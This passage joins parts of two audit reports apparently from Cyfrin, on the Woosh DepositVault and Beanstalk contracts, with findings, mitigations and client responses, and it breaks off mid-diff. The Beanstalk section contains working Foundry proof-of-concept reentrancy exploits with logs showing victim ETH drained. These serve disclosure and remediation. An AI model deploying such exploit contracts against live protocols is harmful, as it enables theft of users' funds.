59:     function withdraw(uint256 amount, uint256 nonce, bytes memory signature, address payable recipient) public {
60:         require(nonce < deposits.length, "Invalid deposit index");
61:         Deposit storage depositToWithdraw = deposits[nonce];
62:         bytes32 withdrawalHash = getWithdrawalHash(Withdrawal(amount, nonce));
63:         address signer = withdrawalHash.recover(signature);
64:         require(signer == depositToWithdraw.depositor, "Invalid signature");
65:         require(!usedWithdrawalHashes[withdrawalHash], "Withdrawal has already been executed");
66:         require(amount == depositToWithdraw.amount, "Withdrawal amount must match deposit amount");//@audit-info only full withdrawal is allowed
67:
68:         usedWithdrawalHashes[withdrawalHash] = true;
69:         depositToWithdraw.amount = 0;
70:
71:         if(depositToWithdraw.tokenAddress == address(0)){
72:             recipient.transfer(amount);
73:         } else {
74:             IERC20 token = IERC20(depositToWithdraw.tokenAddress);
75:             token.safeTransfer(recipient, amount);
76:         }
77:
78:         emit WithdrawalMade(recipient, amount);
79:     }
```

**Recommended Mitigation:** If the protocol intends to only allow full withdrawal, this parameter can be removed completely (that will help save gas as well).
Unnecessary parameters increase the complexity of the function and more error prone.

**Client:**
Agreed, only full withdraws are allowed. Removed.

**Cyfrin:** Verified in commit [b21d23e](https://github.com/HyperGood/woosh-contracts/commit/b21d23e661b0f25f0e757dc00ee90e4464730b1b).

### Functions not used internally could be marked external

**Severity:** Informational

**Description:** Using proper visibility modifiers is a good practice to prevent unintended access to functions.
Furthermore, marking functions as `external` instead of `public` can save gas.

```solidity
File: DepositVault.sol

37:     function deposit(uint256 amount, address tokenAddress) public payable

59:     function withdraw(uint256 amount, uint256 nonce, bytes memory signature, address payable recipient) public

81:     function withdrawDeposit(uint256 depositIndex) public
```

**Recommended Mitigation:** Consider change the visibility modifier to `external` for the functions that are not used internally.

**Client:**
Fixed.

**Cyfrin:** Verified in commit [b21d23e](https://github.com/HyperGood/woosh-contracts/commit/b21d23e661b0f25f0e757dc00ee90e4464730b1b).

## Gas Optimizations
### Use assembly to check for `address(0)`
Saves 6 gas per instance

```solidity
File: DepositVault.sol

40:             require(tokenAddress == address(0), "Token address must be 0x0 for ETH deposits");

45:             require(tokenAddress != address(0), "Token address must not be 0x0 for token deposits");

71:         if(depositToWithdraw.tokenAddress == address(0)){

90:         if(depositToWithdraw.tokenAddress == address(0)){

```
**Client:**
Fixed.

**Cyfrin:** Verified in commit [b21d23e](https://github.com/HyperGood/woosh-contracts/commit/b21d23e661b0f25f0e757dc00ee90e4464730b1b).

### Use calldata instead of memory for function arguments that do not get mutated
Mark data types as `calldata` instead of `memory` where possible. This makes it so that the data is not automatically loaded into memory. If the data passed into the function does not need to be changed (like updating values in an array), it can be passed in as `calldata`. The one exception to this is if the argument must later be passed into another function that takes an argument that specifies `memory` storage.

```solidity
File: DepositVault.sol

55:     function getWithdrawalHash(Withdrawal memory withdrawal) public view returns (bytes32)

59:     function withdraw(uint256 amount, uint256 nonce, bytes memory signature, address payable recipient) public

```
**Client:**
Acknowledged.

**Cyfrin:** Acknowledged.

### Use Custom Errors

Instead of using error strings, to reduce deployment and runtime cost, you should use [Custom Errors](https://blog.soliditylang.org/2021/04/21/custom-errors/). This would save both deployment and runtime cost.

```solidity
File: DepositVault.sol

38:         require(amount > 0 || msg.value > 0, "Deposit amount must be greater than 0");

40:             require(tokenAddress == address(0), "Token address must be 0x0 for ETH deposits");

45:             require(tokenAddress != address(0), "Token address must not be 0x0 for token deposits");

60:         require(nonce < deposits.length, "Invalid deposit index");

64:         require(signer == depositToWithdraw.depositor, "Invalid signature");

65:         require(!usedWithdrawalHashes[withdrawalHash], "Withdrawal has already been executed");

66:         require(amount == depositToWithdraw.amount, "Withdrawal amount must match deposit amount");

82:         require(depositIndex < deposits.length, "Invalid deposit index");

84:         require(depositToWithdraw.depositor == msg.sender, "Only the depositor can withdraw their deposit");

85:         require(depositToWithdraw.amount > 0, "Deposit has already been withdrawn");

```
**Client:**
Fixed.

**Cyfrin:** Verified in commit [b21d23e](https://github.com/HyperGood/woosh-contracts/commit/b21d23e661b0f25f0e757dc00ee90e4464730b1b).


### Use != 0 instead of > 0 for unsigned integer comparison

```solidity
File: DepositVault.sol

38:         require(amount > 0 || msg.value > 0, "Deposit amount must be greater than 0");

38:         require(amount > 0 || msg.value > 0, "Deposit amount must be greater than 0");

39:         if(msg.value > 0)

85:         require(depositToWithdraw.amount > 0, "Deposit has already been withdrawn");

```

**Client:**
Fixed.

**Cyfrin:** Verified in commit [b21d23e](https://github.com/HyperGood/woosh-contracts/commit/b21d23e661b0f25f0e757dc00ee90e4464730b1b).

------ FILE END car/reports_md/2023-09-06-cyfrin-woosh.md ------


------ FILE START car/reports_md/2023-09-12-cyfrin-beanstalk.md ------

**Lead Auditors**

[Giovanni Di Siena](https://twitter.com/giovannidisiena)

[Carlos Amarante](https://twitter.com/carlitox477)

**Assisting Auditors**

[Alex Roan](https://twitter.com/alexroan)


---

# Findings
## High Risk


### Intermediate value sent by the caller can be drained via reentrancy when `Pipeline` execution is handed off to an untrusted external contract

**Description:** Pipeline is a utility contract created by the Beanstalk Farms team that enables the execution of an arbitrary number of valid actions in a single transaction. The `DepotFacet` is a wrapper around Pipeline for use within the Beanstalk Diamond proxy. When utilizing Pipeline through the `DepotFacet`, Ether value is first loaded by a payable call to the Diamond proxy fallback function, which then delegates execution to the logic of the respective facet function. Once the [`DepotFacet::advancedPipe`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/farm/DepotFacet.sol#L55-L62) is called, for example, value is forwarded on to a [function of the same name](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/pipeline/Pipeline.sol#L57-L66) within Pipeline.

```solidity
function advancedPipe(AdvancedPipeCall[] calldata pipes, uint256 value)
    external
    payable
    returns (bytes[] memory results)
{
    results = IPipeline(PIPELINE).advancedPipe{value: value}(pipes);
    LibEth.refundEth();
}
```

The important point to note here is that rather than sending the full Ether amount received by the Diamond proxy, the amount sent to Pipeline is equal to that of the `value` argument above, necessitating the use of [`LibEth::refundEth`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/libraries/Token/LibEth.sol#L16-L26), which itself transfers the entire proxy Ether balance to the caller, following the call to return any unspent Ether.

```solidity
function refundEth()
    internal
{
    AppStorage storage s = LibAppStorage.diamondStorage();
    if (address(this).balance > 0 && s.isFarm != 2) {
        (bool success, ) = msg.sender.call{value: address(this).balance}(
            new bytes(0)
        );
        require(success, "Eth transfer Failed.");
    }
}
```

This logic appears to be correct and work as intended; however, issues can arise due to the lack of reentrancy guard on `DepotFacet` and `Pipeline` functions. Given the nature of Pipeline calls to potentially untrusted external contracts, which themselves may also hand off execution to their own set of untrusted external contracts, this can become an issue if a malicious contract calls back into Beanstalk and/or Pipeline.

```solidity
function advancedPipe(AdvancedPipeCall[] calldata pipes)
    external
    payable
    override
    returns (bytes[] memory results) {
        results = new bytes[](pipes.length);
        for (uint256 i = 0; i < pipes.length; ++i) {
            results[i] = _advancedPipe(pipes[i], results);
        }
    }
```

Continuing with the example of `DepotFacet::advancedPipe`, say, for example, one of the pipe calls involves an NFT mint/transfer in which some external contract is paid royalties in the form of a low-level call with ETH attached or some safe transfer check hands-off execution in this way, the malicious recipient could initiate a call to the Beanstalk Diamond which once again triggers `DepotFacet::advancedPipe` but this time with an empty `pipes` array. Given the implementation of `Pipeline::advancedPipe` above, this will simply return an empty bytes array and fall straight through to the ETH refund. Since the proxy balance is non-zero, assuming `value != msg.value` in the original call, this `msg.value - value` difference will be transferred to the malicious caller. Once execution returns to the original context and the original caller's transaction is nearing completion, the contract will no longer have any excess ETH, even though it is the original caller who should have received a refund of unspent funds.

This finding also applies to `Pipeline` itself, in which a malicious contract can similarly reenter Pipeline and utilize intermediate Ether balance without sending any value of their own. For example, given `getEthValue` does not validate the [clipboard value](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/pipeline/Pipeline.sol#L95C17-L95C22) against the payable value (likely due to its current usage within a loop), `Pipeline::advancedPipe` could be called with a single `AdvancedPipeCall` with [normal pipe encoding](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/pipeline/Pipeline.sol#L99) which calls another address owned by the attacker, again forwarding all remaining Ether given they are able to control the `value` parameter. It is, of course, feasible that the original caller attempts to perform some other more complicated pipes following the first, which may revert with 'out of funds' errors, causing the entire advanced pipe call to fail if no tolerant mode behavior is implemented on the target contract, so the exploiter would need to be strategic in these scenarios if they wish to elevate they exploit from denial-of-service to the stealing of funds.

**Impact:** A malicious external contract handed control of execution during the lifetime of a Pipeline call can reenter and steal intermediate user funds. As such, this finding is determined to be of **HIGH** severity.

**Proof of Concept:** The following forge test demonstrates the ability of an NFT royalty recipient, for example, to re-enter both Beanstalk and Pipeline, draining funds remaining in the Diamond and Pipeline that should have been refunded to/utilized by the original caller at the end of execution:

```solidity
contract DepotFacetPoC is Test {
    RoyaltyRecipient exploiter;
    address exploiter1;
    DummyNFT dummyNFT;
    address victim;

    function setUp() public {
        vm.createSelectFork("mainnet", ATTACK_BLOCK);

        exploiter = new RoyaltyRecipient();
        dummyNFT = new DummyNFT(address(exploiter));
        victim = makeAddr("victim");
        vm.deal(victim, 10 ether);

        exploiter1 = makeAddr("exploiter1");
        console.log("exploiter1: ", exploiter1);

        address _pipeline = address(new Pipeline());
        vm.etch(PIPELINE, _pipeline.code);

        vm.label(BEANSTALK, "Beanstalk Diamond");
        vm.label(address(dummyNFT), "DummyNFT");
        vm.label(address(exploiter), "Exploiter");
    }

    function test_attack() public {
        emit log_named_uint("Victim balance before: ", victim.balance);
        emit log_named_uint("BEANSTALK balance before: ", BEANSTALK.balance);
        emit log_named_uint("PIPELINE balance before: ", PIPELINE.balance);
        emit log_named_uint("DummyNFT balance before: ", address(dummyNFT).balance);
        emit log_named_uint("Exploiter balance before: ", address(exploiter).balance);
        emit log_named_uint("Exploiter1 balance before: ", exploiter1.balance);

        vm.startPrank(victim);
        AdvancedPipeCall[] memory pipes = new AdvancedPipeCall[](1);
        pipes[0] = AdvancedPipeCall(address(dummyNFT), abi.encodePacked(dummyNFT.mintNFT.selector), abi.encodePacked(bytes1(0x00), bytes1(0x01), uint256(1 ether)));
        IBeanstalk(BEANSTALK).advancedPipe{value: 10 ether}(pipes, 4 ether);
        vm.stopPrank();

        emit log_named_uint("Victim balance after: ", victim.balance);
        emit log_named_uint("BEANSTALK balance after: ", BEANSTALK.balance);
        emit log_named_uint("PIPELINE balance after: ", PIPELINE.balance);
        emit log_named_uint("DummyNFT balance after: ", address(dummyNFT).balance);
        emit log_named_uint("Exploiter balance after: ", address(exploiter).balance);
        emit log_named_uint("Exploiter1 balance after: ", exploiter1.balance);
    }
}

contract DummyNFT {
    address immutable i_royaltyRecipient;
    constructor(address royaltyRecipient) {
        i_royaltyRecipient = royaltyRecipient;
    }

    function mintNFT() external payable returns (bool success) {
        // imaginary mint/transfer logic
        console.log("minting/transferring NFT");
        // console.log("msg.value: ", msg.value);

        // send royalties
        uint256 value = msg.value / 10;
        console.log("sending royalties");
        (success, ) = payable(i_royaltyRecipient).call{value: value}("");
    }
}

contract RoyaltyRecipient {
    bool exploited;
    address constant exploiter1 = 0xDE47CfF686C37d501AF50c705a81a48E16606F08;

    fallback() external payable {
        console.log("entered exploiter fallback");
        console.log("Beanstalk balance: ", BEANSTALK.balance);
        console.log("Pipeline balance: ", PIPELINE.balance);
        console.log("Exploiter balance: ", address(this).balance);
        if (!exploited) {
            exploited = true;
            console.log("exploiting depot facet advanced pipe");
            IBeanstalk(BEANSTALK).advancedPipe(new AdvancedPipeCall[](0), 0);
            console.log("exploiting pipeline advanced pipe");
            AdvancedPipeCall[] memory pipes = new AdvancedPipeCall[](1);
            pipes[0] = AdvancedPipeCall(address(exploiter1), "", abi.encodePacked(bytes1(0x00), bytes1(0x01), uint256(PIPELINE.balance)));
            IPipeline(PIPELINE).advancedPipe(pipes);
        }
    }
}

```
As can be seen in the output below, the exploiter is able to net 9 additional Ether at the expense of the victim:
```
Running 1 test for test/DepotFacetPoC.t.sol:DepotFacetPoC
[PASS] test_attack() (gas: 182190)
Logs:
  exploiter1:  0xDE47CfF686C37d501AF50c705a81a48E16606F08
  Victim balance before: : 10000000000000000000
  BEANSTALK balance before: : 0
  PIPELINE balance before: : 0
  DummyNFT balance before: : 0
  Exploiter balance before: : 0
  Exploiter1 balance before: : 0
  entered pipeline advanced pipe
  msg.value:  4000000000000000000
  minting/transferring NFT
  sending royalties
  entered exploiter fallback
  Beanstalk balance:  6000000000000000000
  Pipeline balance:  3000000000000000000
  Exploiter balance:  100000000000000000
  exploiting depot facet advanced pipe
  entered pipeline advanced pipe
  msg.value:  0
  entered exploiter fallback
  Beanstalk balance:  0
  Pipeline balance:  3000000000000000000
  Exploiter balance:  6100000000000000000
  exploiting pipeline advanced pipe
  entered pipeline advanced pipe
  msg.value:  0
  Victim balance after: : 0
  BEANSTALK balance after: : 0
  PIPELINE balance after: : 0
  DummyNFT balance after: : 900000000000000000
  Exploiter balance after: : 6100000000000000000
  Exploiter1 balance after: : 3000000000000000000
```

**Recommended Mitigation:** Add reentrancy guards to both the `DepotFacet` and `Pipeline`. Also, consider validating clipboard Ether values in `Pipeline::_advancedPipe` against the payable function value in `Pipeline::advancedPipe`.


### `FarmFacet` functions are susceptible to the draining of intermediate value sent by the caller via reentrancy when execution is handed off to an untrusted external contract

**Description:** The `FarmFacet` enables multiple Beanstalk functions to be called in a single transaction using Farm calls. Any function stored in Beanstalk's EIP-2535 DiamondStorage can be called as a Farm call and, similar to the Pipeline calls originated in the `DepotFacet`, advanced Farm calls can be made within `FarmFacet` utilizing the "clipboard" encoding [documented](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/libraries/LibFunction.sol#L49-L74) in `LibFunction`.

Both [`FarmFacet::farm`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/farm/FarmFacet.sol#L35-L45) and [`FarmFacet::advancedFarm`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/farm/FarmFacet.sol#L53-L63) make use of the [`withEth` modifier](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/farm/FarmFacet.sol#L100-L107) defined as follows:

```solidity
// signals to Beanstalk functions that they should not refund Eth
// at the end of the function because the function is wrapped in a Farm function
modifier withEth() {
    if (msg.value > 0) s.isFarm = 2;
    _;
    if (msg.value > 0) {
       s.isFarm = 1;
        LibEth.refundEth();
    }
}
```
Used in conjunction with [`LibEth::refundEth`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/libraries/Token/LibEth.sol#L16-L26), within the `DepotFacet`, for example, the call is identified as originating from the `FarmFacet` if `s.isFarm == 2`. This indicates that an ETH refund should occur at the end of top-level FarmFacet function call rather than intermediate Farm calls within Beanstalk so that the value can be utilized in subsequent calls.

```solidity
function refundEth()
    internal
{
    AppStorage storage s = LibAppStorage.diamondStorage();
    if (address(this).balance > 0 && s.isFarm != 2) {
        (bool success, ) = msg.sender.call{value: address(this).balance}(
            new bytes(0)
        );
        require(success, "Eth transfer Failed.");
    }
}
```

Similar to the vulnerabilities in `DepotFacet` and `Pipeline`, `FarmFacet` Farm functions are also susceptible to the draining of intermediate value sent by the caller via reentrancy by an untrusted and malicious external contract. In this case, the attacker could be the recipient of Beanstalk Fertilizer, for example, given this is a likely candidate for an action that may be performed via `FarmFacet` functions, utilizing [`TokenSupportFacet::transferERC1155`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/farm/TokenSupportFacet.sol#L85-L92), and because transfers of these tokens are performed "safely" by calling [`Fertilizer1155:__doSafeTransferAcceptanceCheck`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/tokens/Fertilizer/Fertilizer1155.sol#L42) which in turn calls the `IERC1155ReceiverUpgradeable::onERC1155Received` hook on the Fertilizer recipient.

Continuing the above example, a malicious recipient could call back into the `FarmFacet` and re-enter the Farm functions via the `Fertilizer1155` safe transfer acceptance check with empty calldata and only `1 wei` of payable value. This causes the execution of the attacker's transaction to fall straight through to the refund logic, given no loop iterations occur on the empty data and the conditional blocks within the modifier are entered due to the (ever so slightly) non-zero `msg.value`. The call to `LibEth::refundEth` will succeed since`s.isFarm == 1` in the attacker's context, sending the entire Diamond proxy balance. When execution continues in the context of the original caller's Farm call, it will still enter the conditional since their `msg.value` was also non-zero; however, there is no longer any ETH balance to refund, so this call will fall through without sending any value as the conditional block is not entered.

**Impact:** A malicious external contract handed control of execution during the lifetime of a Farm call can reenter and steal intermediate user funds. As such, this finding is determined to be of **HIGH** severity.

**Proof of Concept:** The following forge test demonstrates the ability of a Fertilizer recipient, for example, to re-enter Beanstalk, draining funds remaining in the Diamond that should have been refunded to the original caller at the end of execution:

```solidity
contract FertilizerRecipient {
    bool exploited;

    function onERC1155Received(address, address, uint256, uint256, bytes calldata) external returns (bytes4) {
        console.log("entered exploiter onERC1155Received");
        if (!exploited) {
            exploited = true;
            console.log("exploiting farm facet farm call");
            AdvancedFarmCall[] memory data = new AdvancedFarmCall[](0);
            IBeanstalk(BEANSTALK).advancedFarm{value: 1 wei}(data);
            console.log("finished exploiting farm facet farm call");
        }
        return bytes4(0xf23a6e61);
    }

    fallback() external payable {
        console.log("entered exploiter fallback");
        console.log("Beanstalk balance: ", BEANSTALK.balance);
        console.log("Exploiter balance: ", address(this).balance);
    }
}

contract FarmFacetPoC is Test {
    uint256 constant TOKEN_ID = 3445713;
    address constant VICTIM = address(0x995D1e4e2807Ef2A8d7614B607A89be096313916);
    FertilizerRecipient exploiter;

    function setUp() public {
        vm.createSelectFork("mainnet", ATTACK_BLOCK);

        FarmFacet farmFacet = new FarmFacet();
        vm.etch(FARM_FACET, address(farmFacet).code);

        Fertilizer fert = new Fertilizer();
        vm.etch(FERTILIZER, address(fert).code);

        assertGe(IERC1155(FERTILIZER).balanceOf(VICTIM, TOKEN_ID), 1, "Victim does not have token");

        exploiter = new FertilizerRecipient();
        vm.deal(address(exploiter), 1 wei);

        vm.label(VICTIM, "VICTIM");
        vm.deal(VICTIM, 10 ether);

        vm.label(BEANSTALK, "Beanstalk Diamond");
        vm.label(FERTILIZER, "Fertilizer");
        vm.label(address(exploiter), "Exploiter");
    }

    function test_attack() public {
        emit log_named_uint("VICTIM balance before: ", VICTIM.balance);
        emit log_named_uint("BEANSTALK balance before: ", BEANSTALK.balance);
        emit log_named_uint("Exploiter balance before: ", address(exploiter).balance);

        vm.startPrank(VICTIM);
        // approve Beanstalk to transfer Fertilizer
        IERC1155(FERTILIZER).setApprovalForAll(BEANSTALK, true);

        // encode call to `TokenSupportFacet::transferERC1155`
        bytes4 selector = 0x0a7e880c;
        assertEq(IBeanstalk(BEANSTALK).facetAddress(selector), address(0x5e15667Bf3EEeE15889F7A2D1BB423490afCb527), "Incorrect facet address/invalid function");

        AdvancedFarmCall[] memory data = new AdvancedFarmCall[](1);
        data[0] = AdvancedFarmCall(abi.encodeWithSelector(selector, address(FERTILIZER), address(exploiter), TOKEN_ID, 1), abi.encodePacked(bytes1(0x00)));
        IBeanstalk(BEANSTALK).advancedFarm{value: 10 ether}(data);
        vm.stopPrank();

        emit log_named_uint("VICTIM balance after: ", VICTIM.balance);
        emit log_named_uint("BEANSTALK balance after: ", BEANSTALK.balance);
        emit log_named_uint("Exploiter balance after: ", address(exploiter).balance);
    }
}
```

As can be seen in the output below, the exploiter is able to steal the excess 10 Ether sent by the victim:

```
Running 1 test for test/FarmFacetPoC.t.sol:FarmFacetPoC
[PASS] test_attack() (gas: 183060)
Logs:
  VICTIM balance before: : 10000000000000000000
  BEANSTALK balance before: : 0
  Exploiter balance before: : 1
  data.length: 1
  entered __doSafeTransferAcceptanceCheck
  to is contract, calling hook
  entered exploiter onERC1155Received
  exploiting farm facet farm call
  data.length: 0
  entered exploiter fallback
  Beanstalk balance:  0
  Exploiter balance:  10000000000000000001
  finished exploiting farm facet farm call
  VICTIM balance after: : 0
  BEANSTALK balance after: : 0
  Exploiter balance after: : 10000000000000000001
```

**Recommended Mitigation:** Add a reentrancy guard to `FarmFacet` Farm functions.

\clearpage
## Medium Risk


### `LibTokenPermit` logic is susceptible to signature replay attacks in the case of a hard fork

**Description:** Due to the implementation of [`LibTokenPermit::_buildDomainSeparator`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/libraries/Token/LibTokenPermit.sol#L59-L69) using the static `CHAIN_ID` [constant](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/libraries/Token/LibTokenPermit.sol#L65) specified in [`C.sol`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/C.sol#L92-L94), in the case of a hard fork, all signed permits from Ethereum mainnet can be replayed on the forked chain.

**Impact:** A signature replay attack on the forked chain means that any signed permit given to an address on one of the chains can be re-used on the other as long as the account nonce is respected. Given that BEAN has a portion of its liquidity in WETH, it could be susceptible to some parallelism with the [Omni Bridge calldata replay exploit](https://medium.com/neptune-mutual/decoding-omni-bridges-call-data-replay-exploit-f1c7e339a7e8) on ETHPoW.

**Recommended Mitigation:** Modify the `_buildDomainSeparator` implementation to read the current `block.chainid` global context variable directly. If gas efficiency is desired, it is recommended to cache the current chain id on contract creation and only recompute the domain separator if a change of chain id is detected (i.e. `block.chainid` != cached chain id).

```diff
    function _buildDomainSeparator(bytes32 typeHash, bytes32 name, bytes32 version) internal view returns (bytes32) {
        return keccak256(
            abi.encode(
                typeHash,
                name,
                version,
-               C.getChainId(),
+               block.chainid,
                address(this)
            )
        );
    }
```


### Duplicate fees will be paid by `LibTransfer::transferFee` when transferring fee-on-transfer tokens with `EXTERNAL_INTERNAL` 'from' mode and `EXTERNAL` 'to' mode

**Description:** Beanstalk utilizes an internal virtual balance system that significantly reduces transaction fees when using tokens that are intended to remain within the protocol. `LibTransfer` achieves this by managing every transfer between accounts, considering both the origin 'from' and destination 'to' modes of the in-flight funds. As a result, there are four types of transfers based on the source of the funds (from mode):

* `EXTERNAL`: The sender will not use their internal balances for the operation.
* `INTERNAL`: The sender will use their internal balances for the operation.
* `EXTERNAL_INTERNAL`: The sender will attempt to utilize their internal balance to transfer all desired funds. If funds remain to be sent, their externally owned funds will be utilized to cover the difference.
* `INTERNAL_TOLERANT`: The sender will utilize their internal balances for the operation. With insufficient internal balance, the operation will continue (without reverting) with this reduced amount. It is, therefore, imperative to always check the return value of LibTransfer functions to continue the execution of calling functions with the true utilized amount, especially in this internal tolerant case.

The current implementation of [`LibTransfer::transferToken`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/libraries/Token/LibTransfer.sol#L43-L44) for `(from mode: EXTERNAL ; to mode: EXTERNAL)` ensures a safe transfer operation from the sender to the recipient:

```solidity
// LibTransfer::transferToken
if (fromMode == From.EXTERNAL && toMode == To.EXTERNAL) {
    uint256 beforeBalance = token.balanceOf(recipient);
    token.safeTransferFrom(sender, recipient, amount);
    return token.balanceOf(recipient).sub(beforeBalance);
}
amount = receiveToken(token, amount, sender, fromMode);
sendToken(token, amount, recipient, toMode);
return amount;
```

Performing this operation allows duplication of fee-on-transfer token fees to be avoided if funds are first transferred to the contract and then to the recipient; however, `LibTransfer::transferToken` balance will incur double the fee if this function is used for `(from mode: EXTERNAL_INTERNAL ; to mode: EXTERNAL)` when the internal balance is insufficient cover the full transfer amount, given that:

1. The remaining token balance would first be transferred to the Beanstalk Diamond, incurring fees.
2. The remaining token balance would then be transferred to the recipient, incurring fees again.

**Impact:** `LibTransfer::transferToken` will incur duplicate fees if this function is used for `(from mode: EXTERNAL_INTERNAL ; to mode: EXTERNAL)` with fee-on-transfer tokens if the internal balance is not sufficient to cover the full transfer amount.

Even though Beanstalk currently does not impose any fees on token transfers, USDT is associated with the protocol, and its contract has already introduced logic to implement a fee on token transfer mechanism if ever desired in the future. Considering that the duplication of fees implies a loss of funds, but also taking into account the low likelihood of this issue occurring, the severity assigned to this issue is **MEDIUM**.

**Recommended Mitigation:** Add an internal function `LibTransfer::handleFromExternalInternalToExternalTransfer` to handle this case to avoid duplication of fees. For instance:

```solidity
function handleFromExternalInternalToExternalTransfer(
    IERC20 token,
    address sender,
    address recipient,
    address amount
) internal {
    uint256 amountFromInternal = LibBalance.decreaseInternalBalance(
        sender,
        token,
        amount,
        true // allowPartial to avoid revert
    );
    uint256 pendingAmount = amount - amountFromInternal;
    if (pendingAmount != 0) {
        token.safeTransferFrom(sender, recipient, pendingAmount);
    }
    token.safeTransfer(sender, amountFromInternal);
}
```

Then consider the use of this new function in `LibTransfer::transferToken`:

```diff
    function transferToken(
        IERC20 token,
        address sender,
        address recipient,
        uint256 amount,
        From fromMode,
        To toMode
    ) internal returns (uint256 transferredAmount) {
-       if (fromMode == From.EXTERNAL && toMode == To.EXTERNAL) {
+       if (toMode == To.EXTERNAL) {
+           if (fromMode == From.EXTERNAL) {
                uint256 beforeBalance = token.balanceOf(recipient);
                token.safeTransferFrom(sender, recipient, amount);
                return token.balanceOf(recipient).sub(beforeBalance);
+           } else if (fromMode == From.EXTERNAL_INTERNAL) {
+               handleFromExternalInternalToExternalTransfer(token, sender, recipient, amount);
+               return amount;
+           }
        }
        amount = receiveToken(token, amount, sender, fromMode);
        sendToken(token, amount, recipient, toMode);
        return amount;
    }
```


### FundraiserFacet logic does not consider contract upgrades which can increase token decimals

**Description:** The fundraiser logic in `FundraiserFacet` assumes that the decimals of the token being raised will remain with the same number of decimals from when a fundraiser is created to when it is funded. In the case of USDC, a contract upgrade that increases the number of decimals would invalidate this assumption, jeopardizing the accounting handled by `s.fundraisers[id].remaining`.

**Impact:** If the original fundraiser token increases its decimals, a user can send fewer tokens than expected through `FundraiserFacet::fund` and receive more Pods than intended.

**Proof of Concept:**
1. Beanstalk creates a USDC fundraiser for 1M USDC
2. USDC decimals are updated from 6 to 18, meaning that the amount of USDC to raise should be $1,000,000 \times 10^{18}$ rather than $1,000,000 \times 10^{6} = 1 \times 10^{12}$.
3. Eve uses $1 \times 10^{12}$ basic units of USDC (now equivalent to $1 \times 10^{-18}$ USDC) to completely fund the fundraiser, receiving Pods for a value of 1M Beans.

The final result is that Beanstalk has received $1 \times 10^{-6}$ USD in USDC in exchange for the issuance of 1M Pods.

**Recommended Mitigation:** It would be advisable to save the decimals during fundraiser creation and check their consistency when calls are made to `FundraiserFacet::fund`. This can be achieved by creating a new function that updates `s.fundraisers[id].remaining` and the saved decimals in case of an update. For instance:

```diff
    // FundraiserFacet.sol
    function createFundraiser(
        address payee,
        address token,
        uint256 amount
    ) external payable {
        LibDiamond.enforceIsOwnerOrContract();

        // The {FundraiserFacet} was initially created to support USDC, which has the
        // same number of decimals as Bean (6). Fundraisers created with tokens measured
        // to a different number of decimals are not yet supported.
        if (ERC20(token).decimals() != 6) {
            revert("Fundraiser: Token decimals");
        }

        uint32 id = s.fundraiserIndex;
        s.fundraisers[id].token = token;
        s.fundraisers[id].remaining = amount;
        s.fundraisers[id].total = amount;
        s.fundraisers[id].payee = payee;
        s.fundraisers[id].start = block.timestamp;
+       s.fundraisers[id].savedDecimals = 6;
        s.fundraiserIndex = id + 1;

        // Mint Beans to pay for the Fundraiser. During {fund}, 1 Bean is burned
        // for each `token` provided to the Fundraiser.
        // Adjust `amount` based on `token` decimals to support tokens with different decimals.
        C.bean().mint(address(this), amount);

        emit CreateFundraiser(id, payee, token, amount);
    }

    function fund(
        uint32 id,
        uint256 amount,
        LibTransfer.From mode
    ) external payable nonReentrant returns (uint256) {
        uint256 remaining = s.fundraisers[id].remaining;

        // Check amount remaining and constrain
        require(remaining > 0, "Fundraiser: completed");
        if (amount > remaining) {
            amount = remaining;
        }
+
+       require(s.fundraisers[id].token.decimals() == s.fundraisers[id].savedDecimals, "Fundraiser token decimals not synchronized.");
+
        // Transfer tokens from msg.sender -> Beanstalk
        amount = LibTransfer.receiveToken(
            IERC20(s.fundraisers[id].token),
            amount,
            msg.sender,
            mode
        );
        s.fundraisers[id].remaining = remaining - amount; // Note: SafeMath is redundant here.
        emit FundFundraiser(msg.sender, id, amount);

        // If completed, transfer tokens to payee and emit an event
        if (s.fundraisers[id].remaining == 0) {
            _completeFundraiser(id);
        }

        // When the Fundraiser was initialized, Beanstalk minted Beans.
        C.bean().burn(amount);

        // Calculate the number of Pods to Sow.
        // Fundraisers bypass Morning Auction behavior and Soil requirements,
        // calculating return only based on the current `s.w.t`.
        uint256 pods = LibDibbler.beansToPods(
            amount,
            uint256(s.w.t).mul(LibDibbler.TEMPERATURE_PRECISION)
        );

        // Sow for Pods and return the number of Pods received.
        return LibDibbler.sowNoSoil(msg.sender, amount, pods);
    }
+
+   function synchronizeFundraiserDecimals(uint32 id) public {
+       uint32 currentTokenDecimals = s.fundraisers[id].token.decimals();
+       uint32 savedDecimals = s.fundraisers[id].savedDecimals;
+       require(currentTokenDecimals != savedDecimals, "Fundraiser token decimals already synchronized");
+       if (currentTokenDecimals > savedDecimals) {
